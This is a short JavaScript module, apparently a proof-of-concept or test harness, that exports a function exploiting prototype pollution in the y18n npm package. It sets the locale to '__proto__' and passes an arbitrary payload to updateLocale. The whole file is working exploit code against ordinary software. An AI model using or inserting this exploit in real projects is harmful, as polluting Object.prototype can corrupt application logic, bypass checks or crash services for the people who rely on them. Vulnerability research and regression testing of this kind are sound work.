function exploitFunction(payload) {
  const y18n = require("y18n")();
  obj = {};

  y18n.setLocale("__proto__");
  y18n.updateLocale(payload); // payload

  return obj;
}

module.exports = { exploitFunction };